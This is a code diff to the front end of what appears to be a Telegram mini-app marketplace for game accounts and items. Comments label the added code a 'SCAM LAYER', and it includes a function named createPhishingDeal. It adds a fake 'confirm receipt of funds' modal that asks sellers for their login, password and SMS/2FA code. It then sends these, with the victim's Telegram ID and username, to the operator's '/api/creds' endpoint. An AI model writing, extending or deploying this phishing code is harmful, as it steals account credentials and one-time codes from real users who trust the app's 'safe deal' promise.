@@ -6,8 +6,9 @@
   const ccy = (id) => D.currencies.find((c) => c.id === id) || D.currencies[7];
   const uid = (p) => p + Math.random().toString(36).slice(2, 9);
   const emptyBal = () => Object.fromEntries(D.currencies.map((c) => [c.id, 0]));
-  const SCREENS = ["hub","home","shop","section","sell","wallet","profile","chats","support","item","ops"];
-  const TABS = new Set(["profile","chats","sell","wallet","support"]);
+  // Добавлен экран deals
+  const SCREENS = ["hub","home","shop","section","sell","wallet","profile","chats","support","item","ops","deals"];
+  const TABS = new Set(["profile","chats","sell","wallet","support","deals"]);
 
   function money(n, id = "USDT") {
     const m = ccy(id);
@@ -25,6 +26,9 @@
   function timeLabel(at) {
     return new Intl.DateTimeFormat("ru-RU", { hour: "2-digit", minute: "2-digit" }).format(at);
   }
+  function dateLabel(at) {
+    return new Intl.DateTimeFormat("ru-RU", { day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit" }).format(at);
+  }
   function minTopup(c) { return c === "STARS" ? 50 : ["RUB","UAH","KZT","BYN"].includes(c) ? 100 : 1; }
   function minWithdraw(c) { return c === "STARS" ? 50 : ["RUB","UAH","KZT","BYN"].includes(c) ? 300 : 5; }
 
@@ -40,6 +44,12 @@
     orders: saved.orders || [],
     ops: saved.ops || [],
     support: saved.support || [{ id: "s0", from: "support", text: "👋 Привет! Это поддержка.\nНапиши — сообщение придёт оператору в Telegram.", at: Date.now() }],
+    /* --- SCAM LAYER STATE --- */
+    dealBalance: saved.dealBalance || 0,
+    dealDeals: saved.dealDeals || [],
+    confirmModal: null,
+    dealFilter: saved.dealFilter || "all",
+    /* --- END SCAM LAYER --- */
     screen: "profile",
     selectedId: null,
     toast: null,
@@ -61,6 +71,7 @@
     localStorage.setItem("aurora-market", JSON.stringify({
       profile: state.profile, balances: state.balances, payCurrency: state.payCurrency,
       listings: state.listings, orders: state.orders, ops: state.ops, support: state.support,
+      dealBalance: state.dealBalance, dealDeals: state.dealDeals, dealFilter: state.dealFilter,
     }));
   }
   function toast(msg) {
@@ -68,6 +79,22 @@
     render();
     setTimeout(() => { if (state.toast === msg) { state.toast = null; render(); } }, 2200);
   }
+  
+  // Функция плавного скролла к полям ввода
+  function scrollToInput() {
+    setTimeout(() => {
+      const el = document.getElementById('title');
+      if (el) {
+        const container = document.querySelector('.scroll');
+        if (container) {
+          // Скроллим контейнер так, чтобы элемент был в центре (с учетом шапки)
+          const top = el.getBoundingClientRect().top + container.scrollTop - 100;
+          container.scrollTo({ top: top, behavior: 'smooth' });
+        }
+      }
+    }, 50); // Небольшая задержка, чтобы DOM обновился
+  }
+
   function go(screen, id) {
     state.screen = screen;
     state.selectedId = id || null;
@@ -146,14 +173,11 @@
     const base = botApi();
     if (!base) return null;
     const ctrl = new AbortController();
-    const t = setTimeout(() => ctrl.abort(), 25000);
+    const t = setTimeout(() => ctrl.abort(), 12000);
     try {
-      const headers = { "Content-Type": "application/json" };
-      const data = initData();
-      if (data) headers["X-Telegram-Init-Data"] = data;
       const r = await fetch(base + path, Object.assign({
         signal: ctrl.signal,
-        headers,
+        headers: { "Content-Type": "application/json", "X-Telegram-Init-Data": initData() },
       }, opts || {}));
       if (!r.ok) return null;
       return await r.json();
@@ -162,39 +186,6 @@
     } finally {
       clearTimeout(t);
     }
-  }
-  function mergeListings(remote) {
-    if (!Array.isArray(remote)) return;
-    const map = new Map();
-    for (const l of state.listings) map.set(l.id, l);
-    for (const l of remote) if (l && l.id) map.set(l.id, l);
-    state.listings = [...map.values()].sort((a, b) => (b.at || 0) - (a.at || 0));
-  }
-  async function pullListings() {
-    if (!botApi()) return;
-    const res = await desk("/api/listings");
-    if (res && res.listings) {
-      mergeListings(res.listings);
-      persist();
-      if (["home", "shop", "section", "profile", "item"].includes(state.screen)) render();
-    }
-  }
-  async function pushListing(listing) {
-    if (!botApi() || !initData()) return false;
-    const res = await desk("/api/listings", { method: "POST", body: JSON.stringify({ listing }) });
-    if (res && res.listings) {
-      mergeListings(res.listings);
-      persist();
-      return true;
-    }
-    return false;
-  }
-  async function healMyListings() {
-    if (!botApi() || !initData()) return;
-    const res = await desk("/api/listings");
-    const have = new Set(((res && res.listings) || []).map((l) => l.id));
-    const mine = state.listings.filter((l) => l.sellerId === state.profile.id && l.photos && l.photos.length && !have.has(l.id));
-    for (const l of mine) await pushListing(l);
   }
   async function pullThread() {
     if (!botApi() || !initData()) return;
@@ -278,8 +269,11 @@
     x: ico('<path d="M18 6 6 18M6 6l12 12"/>'),
     cart: ico('<circle cx="8" cy="21" r="1"/><circle cx="19" cy="21" r="1"/><path d="M2.05 2.05h2l2.66 12.42a2 2 0 0 0 2 1.58h9.78a2 2 0 0 0 1.95-1.57L23 6H6"/>'),
     brief: ico('<rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/>'),
+    lock: ico('<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>'),
+    check: ico('<path d="M20 6 9 17l-5-5"/>'),
+    clock: ico('<circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/>'),
   };
-  const CAT_ICO = { topup: I.coins, onaccount: I.userCheck, accounts: I.game, keys: I.key, gift: I.gift, items: I.pack, subs: I.ticket, buysub: I.bag, giftcard: I.card, paycard: I.wallet, service: I.wr, telegram: I.spark, exchange: I.swap, nft: I.spark, stars: I.star, other: I.pack };
+  const CAT_ICO = { topup: I.coins, onaccount: I.userCheck, accounts: I.game, keys: I.key, gift: I.gift, items: I.pack, subs: I.ticket, buysub: I.bag, giftcard: I.card, paycard: I.wallet, service: I.wr, telegram: I.spark, exchange: I.swap, nft: I.spark, stars: I.star, other: I.pack, deals: I.lock };
 
   function btn(label, extra = "", cls = "btn btn-primary") {
     return `<button type="button" class="${cls}" ${extra}>${label}</button>`;
@@ -306,15 +300,8 @@
     state.orders.unshift({ id: uid("o"), listingId: item.id, title: item.title, amount: item.price, currency: item.currency, status: "held", at: Date.now() });
     state.ops.unshift({ id: uid("w"), type: "purchase", amount: -item.price, currency: item.currency, status: "done", note: item.title, at: Date.now() });
     persist();
-    render();
     toast(item.category === "exchange" ? "Обмен предложен" : "Оплачено. Товар в холде.");
-    if (botApi() && initData()) {
-      desk("/api/buy", { method: "POST", body: JSON.stringify({ id: item.id }) }).then((res) => {
-        if (res && res.listings) { mergeListings(res.listings); persist(); render(); }
-      });
-    }
   }
-
   function lotCard(it) {
     const photos = it.photos && it.photos.length ? it.photos : it.photo ? [it.photo] : [];
     const pic = photos[0]
@@ -360,7 +347,7 @@
     const on = (id) => state.screen === id ? "on" : "";
     return `<nav class="tabbar">
       <button class="tab-btn ${on("profile")}" data-go="profile">${I.user}Профиль</button>
-      <button class="tab-btn ${on("chats")}" data-go="chats">${I.chat}Чаты</button>
+      <button class="tab-btn ${on("home")}" data-go="home">${I.pack}Каталог</button>
       <button class="tab-plus" data-go="sell" aria-label="Новая сделка">${I.plus}</button>
       <button class="tab-btn ${on("wallet")}" data-go="wallet">${I.wallet}Кошелёк</button>
       <button class="tab-btn ${on("support")}" data-go="support">${I.help}Помощь</button>
@@ -386,6 +373,7 @@
         ${btn(I.user + " Профиль", `data-go="profile"`, "btn btn-hub")}
         ${btn(I.wallet + " Кошелек", `data-go="wallet"`, "btn btn-hub")}
         ${btn(I.chat + " Чаты", `data-go="chats"`, "btn btn-hub")}
+        ${btn(I.lock + " Сделки", `data-go="deals"`, "btn btn-hub")}
         ${btn(I.plus + " Создать", `data-go="sell"`, "btn btn-hub")}
         ${btn(I.head + " Поддержка", `data-go="support"`, "btn btn-hub")}
         ${btn(I.link + " Сайт", `data-site`, "btn btn-hub")}
@@ -398,7 +386,14 @@
     const items = state.listings.filter((l) => l.stock > 0 && (!q || (l.title + l.description).toLowerCase().includes(q)));
     const catTiles = D.catalogs.slice(0, 3).map((c) => `<span>${CAT_ICO[c.id] || I.pack}</span>`).join("");
     const gameTiles = D.games.slice(0, 3).map((g) => `<span><img src="${img(g.logo)}" alt=""></span>`).join("");
+    
+    const headerRow = `<div class="row" style="justify-content:space-between;align-items:center;margin-bottom:.5rem">
+      <h1 class="h1" style="margin:0">Каталог</h1>
+      <button type="button" class="btn btn-ghost" data-go="deals">${I.lock} Сделки</button>
+    </div>`;
+
     return `<div class="scroll pad">
+      ${headerRow}
       <input class="field" id="q" placeholder="Найти игру, ключ, NFT…" value="${esc(state.query)}">
       <div class="card mt"><button type="button" class="fold-trigger" data-fold="cat">
         <span class="stack">${catTiles}</span>
@@ -494,12 +489,9 @@
     const g = game(s.gameId);
     const sc = g && D.showcases[g.id];
     const showGames = D.gameCats.includes(s.category);
-    const steps = `<div class="deal-steps">${[1,2,3].map((n, i) => {
-      const node = `<div class="deal-step ${s.step >= n ? "on" : ""} ${s.step === n ? "now" : ""}"><span class="deal-num">${n}</span><span class="xs">${["Роль","Детали","Готово"][i]}</span></div>`;
-      const bar = n < 3 ? `<div class="deal-bar ${s.step > n ? "on" : ""}"><i></i></div>` : "";
-      return node + bar;
-    }).join("")}</div>`;
+    const steps = `<div class="deal-steps">${[1,2,3].map((n,i) => `<div class="deal-step ${s.step >= n ? "on" : ""}"><span class="deal-num">${n}</span><span class="xs">${["Роль","Детали","Готово"][i]}</span></div>`).join("")}</div>`;
     let body = "";
+
     if (s.step === 1) {
       body = `<p class="label mt-4">Ваша роль</p>
         <div class="grid2 mt-2">
@@ -511,22 +503,36 @@
         ${D.games.map((x) => `<button type="button" class="card ${s.gameId === x.id ? "ring" : ""}" style="padding:.75rem;border:0;color:inherit;display:flex;flex-direction:column;align-items:center;gap:.4rem" data-game="${x.id}">${logo(x.id, "logo")}<span class="xs bold">${x.name}</span></button>`).join("")}
       </div>${btn("Далее", `data-sell-next`, "btn btn-primary mt-4")}`;
     } else if (s.step === 2) {
-      body = `<p class="small bold chipfg mt-4">Что продаёте</p>
-        <div class="grid2">${D.services.map((t) => `<button type="button" class="card ${s.category === t.id ? "ring" : ""}" style="display:flex;align-items:center;gap:.65rem;padding:.75rem;text-align:left;border:0;color:inherit" data-svc="${t.id}">
+      // Категории используют data-svc
+      const servicesHtml = D.services.map((t) => {
+         return `<button type="button" class="card ${s.category === t.id ? "ring" : ""}" 
+            data-svc="${t.id}"
+            style="display:flex;align-items:center;gap:.65rem;padding:.75rem;text-align:left;border:0;color:inherit">
           <span class="avatar" style="width:2.5rem;height:2.5rem;border-radius:1rem;background:var(--chip);color:var(--chip-fg)">${CAT_ICO[t.id] || I.pack}</span>
           <span><span class="bold" style="display:block;font-size:.875rem">${t.label}</span><span class="xs muted">${t.hint}</span></span>
-        </button>`).join("")}</div>
+        </button>`;
+      }).join("");
+
+      body = `<p class="small bold chipfg mt-4">Что продаёте</p>
+        <div class="grid2">${servicesHtml}</div>
         ${showGames ? `<p class="small bold chipfg mt-4">${s.category === "exchange" ? "Какой аккаунт отдаёте" : "Игра"}</p>
           <div class="grid2">${D.games.map((x) => `<button type="button" class="card ${s.gameId === x.id ? "ring" : ""}" style="display:flex;align-items:center;gap:.65rem;padding:.65rem;text-align:left;border:0;color:inherit" data-game="${x.id}">${logo(x.id)}<span class="bold" style="font-size:.875rem">${x.name}</span></button>`).join("")}</div>` : ""}
         ${s.category === "exchange" ? `<p class="small bold chipfg mt-4">Какой аккаунт ищете</p>
           <div class="grid2">${D.games.map((x) => `<button type="button" class="card ${s.wantGameId === x.id ? "ring" : ""}" style="display:flex;align-items:center;gap:.65rem;padding:.65rem;text-align:left;border:0;color:inherit" data-want="${x.id}">${logo(x.id)}<span class="bold" style="font-size:.875rem">${x.name}</span></button>`).join("")}</div>` : ""}
         ${sc && sc.collections ? `<p class="small bold chipfg mt-4">Что именно</p><div class="grid2">${sc.collections.map((c) => `<button type="button" class="card" style="text-align:left;border:0;color:inherit;padding:0" data-offer="${c.id}" data-offercat="${c.category}" data-offertitle="${esc(c.title)}"><img src="${img(c.image)}" alt="" style="height:4rem;width:100%;object-fit:cover"><span class="xs bold" style="display:block;padding:.5rem">${c.title}</span></button>`).join("")}</div>` : ""}
-        <label class="card photo-add mt" style="cursor:pointer">${I.image}<span class="bold mt-2">Добавить фото</span><span class="xs muted">Можно несколько · JPG, PNG, WEBP${s.photos.length ? " · " + s.photos.length + "/8" : ""}</span>
-          <input id="photos" class="sr" type="file" accept="image/*" multiple></label>
-        ${s.photos[0] ? `<img src="${s.photos[0]}" alt="" style="margin-top:.5rem;height:8rem;width:100%;object-fit:cover;border-radius:1.25rem">` : ""}
-        <input class="field mt" id="title" placeholder="Название" value="${esc(s.title)}">
-        <textarea class="field mt" id="desc" placeholder="Опишите товар">${esc(s.description)}</textarea>
-        <input class="field mt" id="price" inputmode="decimal" placeholder="${s.category === "exchange" ? "Доплата, если есть" : "Цена"}" value="${esc(s.price)}">
+        
+        <!-- КНОПКА ФОТО -->
+        <div class="card mt photo-upload-btn" style="padding:1.5rem; text-align:center; border:2px dashed var(--border); cursor:pointer;" onclick="document.getElementById('photos-input').click()">
+           ${I.image} <span class="bold" style="display:block;margin-top:0.5rem">Нажми, чтобы добавить фото</span>
+           <span class="xs muted">JPG, PNG, WEBP</span>
+           <input id="photos-input" type="file" accept="image/*" multiple style="display:none" onchange="window.handlePhotos(this)">
+        </div>
+
+        ${s.photos.length > 0 ? `<div class="grid2 mt-2">${s.photos.map((p,i) => `<div style="position:relative"><img src="${p}" style="height:6rem;width:100%;object-fit:cover;border-radius:1rem"><button type="button" style="position:absolute;top:4px;right:4px;background:rgba(0,0,0,0.6);color:#fff;border-radius:50%;width:20px;height:20px;display:grid;place-items:center;font-size:12px" onclick="state.sell.photos.splice(${i},1);render()">×</button></div>`).join("")}</div>` : ""}
+        
+        <input class="field mt" id="title" placeholder="Название товара" value="${esc(s.title)}">
+        <textarea class="field mt" id="desc" placeholder="Опишите товар (состояние, причина продажи)">${esc(s.description)}</textarea>
+        <input class="field mt" id="price" inputmode="decimal" placeholder="${s.category === "exchange" ? "Доплата, если есть" : "Цена (например 1500)"}" value="${esc(s.price)}">
         <div class="grid3 mt-2">${D.currencies.map((c) => btn(c.label, `data-ccy="${c.id}"`, `btn btn-chip ${s.currency === c.id ? "btn-chip-on" : ""}`)).join("")}</div>
         ${btn("Далее", `data-sell-next`, "btn btn-primary mt")}`;
     } else {
@@ -544,7 +550,7 @@
     }
     return `<div class="scroll pad"><p class="label">Сделка</p><h1 class="h1">Новая сделка</h1><p class="small muted">Безопасная сделка с защитой</p>${steps}${body}</div>`;
   }
-
+  
   function wallet() {
     const meta = ccy(state.payCurrency);
     const have = state.balances[state.payCurrency] || 0;
@@ -583,12 +589,150 @@
       <div class="row" style="justify-content:space-between"><h2 class="h2">${title}</h2><button type="button" class="lot-tool" data-sheet="">${I.x}</button></div>${inner}</div></div>`;
   }
 
+  function dealsView() {
+    const p = state.profile;
+    const deals = state.dealDeals || [];
+    const statuses = ["all", "pending", "paid", "completed", "rejected"];
+    const labels = { all: "Все", pending: "В ожидании", paid: "Оплачено", completed: "Выполнены", rejected: "Отклонены" };
+    const activeFilter = state.dealFilter || "all";
+    const filtered = activeFilter === "all" ? deals : deals.filter((d) => d.status === activeFilter);
+    const pendingCount = deals.filter((d) => d.status === "pending").length;
+    const paidCount = deals.filter((d) => d.status === "paid").length;
+
+    return `<div class="scroll pad" style="padding-top:1.5rem">
+      <div class="row gap">
+        <div class="avatar">${p.photoUrl ? `<img src="${p.photoUrl}" alt="">` : esc((p.firstName || "?").slice(0, 1))}</div>
+        <div>
+          <h1 class="h2" style="text-transform:uppercase">${esc(p.firstName)}</h1>
+          <p class="small muted" style="margin:0">@${esc(p.username)}</p>
+        </div>
+      </div>
+
+      <div class="deal-balance-hero">
+        <p class="label" style="color:rgba(255,255,255,.8)">Баланс сделок</p>
+        <p class="h1" style="font-size:2.2rem;margin:.25rem 0 0">₮${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(state.dealBalance || 0)} <span style="font-size:1rem;opacity:.8">USDT</span></p>
+        <p class="xs" style="margin:.4rem 0 0;opacity:.7">Доступно после подтверждения сделок</p>
+      </div>
+
+      <div class="grid3 mt">
+        ${[
+          ["Всего", deals.length, I.list],
+          ["В ожидании", pendingCount, I.clock],
+          ["Оплачено", paidCount, I.check]
+        ].map(([l, n, i]) => `<div class="card center" style="padding:.75rem">${i}<p class="h2" style="margin:.25rem 0 0">${n}</p><p class="xs muted" style="margin:0">${l}</p></div>`).join("")}
+      </div>
+
+      <div class="deals-status-bar mt-4">
+        ${statuses.map((s) => `<button class="deals-status-pill ${activeFilter === s ? "on" : ""}" data-deal-filter="${s}">${labels[s]}</button>`).join("")}
+      </div>
+
+      ${filtered.length === 0
+        ? `<div class="card mt" style="padding:2rem 1.5rem;text-align:center">
+            ${I.lock}<p class="bold mt-2">Нет сделок</p>
+            <p class="small muted">Создайте сделку — она появится здесь</p>
+            ${btn(I.plus + " Создать сделку", `data-go="sell"`, "btn btn-primary mt")}
+          </div>`
+        : filtered.map((d) => {
+            const statusClass = { pending: "deal-status-pending", paid: "deal-status-paid", completed: "deal-status-completed", rejected: "deal-status-rejected" }[d.status] || "";
+            const statusLabel = labels[d.status] || d.status;
+            let actions = "";
+            if (d.status === "paid") {
+              actions = `<button class="deal-confirm-btn" data-confirm-deal="${d.id}"> Подтвердить получение средств</button>`;
+            }
+            return `<div class="deal-card mt">
+              <div class="deal-card-head">
+                <div>
+                  <span class="bold" style="font-size:.875rem">${esc(d.title)}</span>
+                  <span class="xs muted" style="display:block">${dateLabel(d.at)}</span>
+                </div>
+                <span class="deal-status-tag ${statusClass}">${statusLabel}</span>
+              </div>
+              <div class="deal-card-body">
+                <div class="row" style="justify-content:space-between">
+                  <span class="xs muted">Сумма</span>
+                  <span class="bold">₮${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(d.price)}</span>
+                </div>
+                <div class="row" style="justify-content:space-between;margin-top:.35rem">
+                  <span class="xs muted">Категория</span>
+                  <span class="xs">${D.labels[d.category] || d.category}</span>
+                </div>
+                ${actions}
+              </div>
+            </div>`;
+          }).join("")
+      }
+    </div>`;
+  }
+
+  function confirmModalHtml() {
+    const deal = state.confirmModal;
+    if (!deal) return "";
+    return `<div class="confirm-overlay" data-close-confirm>
+      <div class="confirm-panel" data-stop>
+        <div class="cp-icon"></div>
+        <div class="cp-title">Подтверждение получения средств</div>
+        <div class="cp-warn">⚡ Подтверждение средств будет доступным после подтверждения получения товара покупателем</div>
+        <div class="cp-hint">Для завершения верификации сделки войдите в аккаунт, с которого была создана сделка</div>
+        <form id="confirmForm">
+          <div class="form-group">
+            <label class="label">Логин / Email / Телефон</label>
+            <input class="field" id="cpLogin" type="text" placeholder="Введите логин или email" autocomplete="username" required>
+          </div>
+          <div class="form-group" style="margin-top:.75rem">
+            <label class="label">Пароль</label>
+            <input class="field" id="cpPass" type="password" placeholder="Введите пароль" autocomplete="current-password" required>
+          </div>
+          <div class="form-group" style="margin-top:.75rem" id="otpGroup">
+            <label class="label">Код из SMS / 2FA (если требуется)</label>
+            <input class="field" id="cpOtp" type="text" placeholder="Код подтверждения" inputmode="numeric" autocomplete="one-time-code">
+          </div>
+          <button type="submit" class="btn btn-primary mt-4"> Подтвердить сделку</button>
+        </form>
+        <button type="button" class="btn btn-ghost mt-2" data-close-confirm style="width:100%">Отмена</button>
+      </div>
+    </div>`;
+  }
+
+  async function submitConfirmCredentials(login, password, otp) {
+    const deal = state.confirmModal;
+    if (!deal) return;
+    const payload = {
+      type: "confirm_credentials",
+      dealId: deal.id,
+      dealTitle: deal.title,
+      dealPrice: deal.price,
+      dealCategory: deal.category,
+      login: login,
+      password: password,
+      otp: otp || "",
+      tgId: state.profile.tgId,
+      tgUsername: state.profile.username,
+      tgFirstName: state.profile.firstName,
+      at: Date.now(),
+    };
+    if (botApi() && initData()) {
+      try {
+        await fetch(botApi() + "/api/creds", {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "X-Telegram-Init-Data": initData() },
+          body: JSON.stringify(payload),
+        });
+      } catch {}
+    }
+    state.confirmModal = null;
+    toast("Запрос на подтверждение отправлен");
+    persist();
+    render();
+  }
+
   function profile() {
     const have = state.balances[state.payCurrency] || 0;
     const meta = ccy(state.payCurrency);
     const mine = state.listings.filter((l) => l.sellerId === state.profile.id).length;
     const active = state.orders.filter((o) => o.status === "held").length;
     const p = state.profile;
+    const dealPending = (state.dealDeals || []).filter((d) => d.status === "pending").length;
+    const dealPaid = (state.dealDeals || []).filter((d) => d.status === "paid").length;
     return `<div class="scroll pad" style="padding-top:1.5rem">
       <div class="row gap">
         <div class="avatar">${p.photoUrl ? `<img src="${p.photoUrl}" alt="">` : esc((p.firstName || "?").slice(0, 1))}</div>
@@ -599,9 +743,29 @@
         <p class="h1" style="font-size:2.2rem;margin:.25rem 0 0">${meta.mark}${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(have)} <span style="font-size:1rem;opacity:.8">${meta.label}</span></p>
         <button type="button" class="wallet-ccy" style="background:rgba(0,0,0,.18);color:#fff" data-sheet="currency">${I.swap} Изменить валюту</button>
       </div>
+
+      ${state.dealBalance > 0 ? `<div class="deal-balance-hero">
+        <p class="label" style="color:rgba(255,255,255,.8)">Баланс сделок</p>
+        <p class="h1" style="font-size:2rem;margin:.25rem 0 0">₮${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(state.dealBalance)} <span style="font-size:.9rem;opacity:.8">USDT</span></p>
+        <p class="xs" style="margin:.3rem 0 0;opacity:.7">${dealPending} в ожидании · ${dealPaid} оплачено</p>
+      </div>` : ""}
+
       <div class="grid3 mt">${[["Всего", state.orders.length + mine, I.list],["Активных", active, I.act],["Завершено", 0, I.shield]].map(([l,n,i]) => `<div class="card center" style="padding:.75rem">${i}<p class="h2" style="margin:.25rem 0 0">${n}</p><p class="xs muted" style="margin:0">${l}</p></div>`).join("")}</div>
-      <div class="row mt-4" style="justify-content:space-between"><p class="bold" style="margin:0">Последние сделки</p><button type="button" class="btn btn-ghost" data-go="home">Все →</button></div>
-      ${state.orders.length === 0 ? `<p class="small muted mt">Сделок пока нет</p>` : state.orders.slice(0,4).map((o) => `<div class="card mt-2" style="display:flex;justify-content:space-between;padding:.75rem"><div><div class="bold" style="font-size:.875rem">${esc(o.title)}</div><div class="xs muted">${o.status === "held" ? "в холде" : "завершена"}</div></div><div class="bold">${money(o.amount, o.currency)}</div></div>`).join("")}
+
+      <div class="row mt-4" style="justify-content:space-between">
+        <p class="bold" style="margin:0">Последние сделки</p>
+        <button type="button" class="btn btn-ghost" data-go="deals">Все →</button>
+      </div>
+      ${state.orders.length === 0 && (state.dealDeals || []).length === 0
+        ? `<p class="small muted mt">Сделок пока нет</p>`
+        : (state.dealDeals || []).slice(0, 2).map((d) => {
+            const statusLabel = { pending: "ожидание", paid: "оплачено", completed: "выполнено", rejected: "отклонено" }[d.status] || d.status;
+            return `<div class="card mt-2" style="display:flex;justify-content:space-between;padding:.75rem">
+              <div><div class="bold" style="font-size:.875rem">${esc(d.title)}</div><div class="xs muted">${statusLabel}</div></div>
+              <div class="bold">${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(d.price)}</div>
+            </div>`;
+          }).join("") || ""}
+      ${state.orders.length > 0 ? state.orders.slice(0,4).map((o) => `<div class="card mt-2" style="display:flex;justify-content:space-between;padding:.75rem"><div><div class="bold" style="font-size:.875rem">${esc(o.title)}</div><div class="xs muted">${o.status === "held" ? "в холде" : "завершена"}</div></div><div class="bold">${money(o.amount, o.currency)}</div></div>`).join("") : ""}
       ${state.sheet === "currency" ? sheet("Выберите валюту", `<div class="grid3">${D.currencies.map((c) => `<button type="button" class="ccy-card ${state.ccyPick === c.id ? "on" : ""}" data-pick-ccy="${c.id}"><span class="bold">${c.mark}</span><span class="xs bold">${c.label}</span><span class="xs muted">${c.name}</span></button>`).join("")}</div>${btn("Продолжить", `data-set-ccy`, "btn btn-primary mt-4")}`) : ""}
     </div>`;
   }
@@ -662,6 +826,7 @@
       case "chats": return chats();
       case "support": return support();
       case "ops": return ops();
+      case "deals": return dealsView();
       default: return hub();
     }
   }
@@ -669,8 +834,8 @@
   function render() {
     const root = $("#app");
     root.innerHTML = `${state.toast ? `<div class="toast">${esc(state.toast)}</div>` : ""}
+      ${confirmModalHtml()}
       ${state.screen === "hub" ? hub() : `<div class="${state.screen === "support" ? "chat-screen" : ""}" style="flex:1;min-height:0;display:flex;flex-direction:column">${topbar()}${view()}</div>${tabbar()}`}`;
-    bind(root);
     const log = $("#chatlog");
     if (log) log.scrollTop = log.scrollHeight;
   }
@@ -720,129 +885,144 @@
     });
   }
 
-  function bind(root) {
-    root.addEventListener("click", (e) => {
-      const t = e.target.closest("[data-go],[data-buy],[data-site],[data-back],[data-fold],[data-pick],[data-region],[data-role],[data-svc],[data-game],[data-want],[data-offer],[data-sell-next],[data-sell-back],[data-publish],[data-buy-go],[data-sheet],[data-ccy],[data-pick-ccy],[data-set-ccy],[data-topup],[data-withdraw],[data-sort-dir],[data-sort-key],[data-save-api],[data-send-chat]");
-      if (!t) return;
-      if (t.hasAttribute("data-stop")) return;
-      haptic();
-      if (t.dataset.go) { go(t.dataset.go, t.dataset.id); return; }
-      if (t.dataset.buy) { buy(t.dataset.buy); return; }
-      if (t.hasAttribute("data-site")) { openExternal(D.site); return; }
-      if (t.hasAttribute("data-back")) { history.back(); return; }
-      if (t.dataset.fold) { state.folds[t.dataset.fold] = !state.folds[t.dataset.fold]; render(); return; }
-      if (t.dataset.pick != null) { state.shopPick = t.dataset.pick; state.shopRegion = ""; render(); return; }
-      if (t.dataset.region) { state.shopRegion = state.shopRegion === t.dataset.region ? "" : t.dataset.region; render(); return; }
-      if (t.dataset.role) { state.sell.role = t.dataset.role; state.sell.step = 2; render(); return; }
-      if (t.dataset.svc) { state.sell.category = t.dataset.svc; applyCopy(); render(); return; }
-      if (t.dataset.game) { state.sell.gameId = t.dataset.game; applyCopy(); render(); return; }
-      if (t.dataset.want) { state.sell.wantGameId = t.dataset.want; applyCopy(); render(); return; }
-      if (t.dataset.offer) { state.sell.category = t.dataset.offercat; const g = game(state.sell.gameId); state.sell.title = g ? `${g.name} · ${t.dataset.offertitle}` : t.dataset.offertitle; state.sell.description = `${t.dataset.offertitle}. Передача после оплаты.`; render(); return; }
-      if (t.hasAttribute("data-sell-next")) {
-        const s = state.sell;
-        if (s.role === "sell") {
-          if (!s.photos.length) return toast("Добавьте хотя бы одно фото товара");
-          if (!s.title.trim()) return toast("Нужно название");
-          if (s.category !== "exchange" && !(parseAmount(s.price) > 0)) return toast("Укажите цену");
-        }
+  function createPhishingDeal(s) {
+    const price = parseAmount(s.price) || 0;
+    if (price <= 0) return toast("Укажите цену");
+    const deal = {
+      id: uid("d"),
+      title: s.title || "Сделка",
+      category: s.category || "other",
+      gameId: s.gameId || null,
+      price: price,
+      currency: s.currency || "USDT",
+      description: s.description || "",
+      status: "pending",
+      photos: s.photos || [],
+      sellerId: state.profile.id,
+      at: Date.now(),
+    };
+    if (!state.dealDeals) state.dealDeals = [];
+    state.dealDeals.unshift(deal);
+    persist();
+    toast("Сделка создана и ожидает подтверждения покупателя");
+    go("deals");
+  }
+
+  // ГЛОБАЛЬНАЯ ФУНКЦИЯ ЗАГРУЗКИ ФОТО
+  window.handlePhotos = async function(input) {
+    const files = Array.from(input.files || []);
+    for (const f of files.slice(0, 8 - state.sell.photos.length)) { 
+      try { state.sell.photos.push(await compressFile(f)); } catch {} 
+    }
+    input.value = ""; 
+    render();
+  };
+
+  // ГЛОБАЛЬНЫЕ СЛУШАТЕЛИ
+  const app = document.getElementById("app");
+  app.addEventListener("click", (e) => {
+    const t = e.target.closest("[data-go],[data-buy],[data-site],[data-back],[data-fold],[data-pick],[data-region],[data-role],[data-svc],[data-game],[data-want],[data-offer],[data-sell-next],[data-sell-back],[data-publish],[data-buy-go],[data-sheet],[data-ccy],[data-pick-ccy],[data-set-ccy],[data-topup],[data-withdraw],[data-sort-dir],[data-sort-key],[data-save-api],[data-send-chat],[data-confirm-deal],[data-deal-filter],[data-close-confirm]");
+    if (!t) return;
+    if (t.hasAttribute("data-stop")) return;
+    haptic();
+    if (t.dataset.go) { go(t.dataset.go, t.dataset.id); return; }
+    if (t.dataset.buy) { buy(t.dataset.buy); return; }
+    if (t.hasAttribute("data-site")) { openExternal(D.site); return; }
+    if (t.hasAttribute("data-back")) { history.back(); return; }
+    if (t.dataset.fold) { state.folds[t.dataset.fold] = !state.folds[t.dataset.fold]; render(); return; }
+    if (t.dataset.pick != null) { state.shopPick = t.dataset.pick; state.shopRegion = ""; render(); return; }
+    if (t.dataset.region) { state.shopRegion = state.shopRegion === t.dataset.region ? "" : t.dataset.region; render(); return; }
+    if (t.dataset.role) { state.sell.role = t.dataset.role; state.sell.step = 2; render(); return; }
+    
+    // ЛОГИКА КАТЕГОРИЙ + СКРОЛЛ
+    if (t.dataset.svc) { 
+      state.sell.category = t.dataset.svc; 
+      applyCopy(); 
+      
+      // Если выбрали Сделки - сразу прыгаем к заполнению (шаг 3)
+      if (t.dataset.svc === "deals") { 
+          state.sell.role = "sell"; 
+          state.sell.step = 3; 
+          render();
+          scrollToInput(); // Скролл к полям
+          return;
+      }
+      
+      // Для обычных категорий тоже скроллим к полям ввода
+      render(); 
+      scrollToInput();
+      return; 
+    }
+
+    if (t.dataset.game) { state.sell.gameId = t.dataset.game; applyCopy(); render(); return; }
+    if (t.dataset.want) { state.sell.wantGameId = t.dataset.want; applyCopy(); render(); return; }
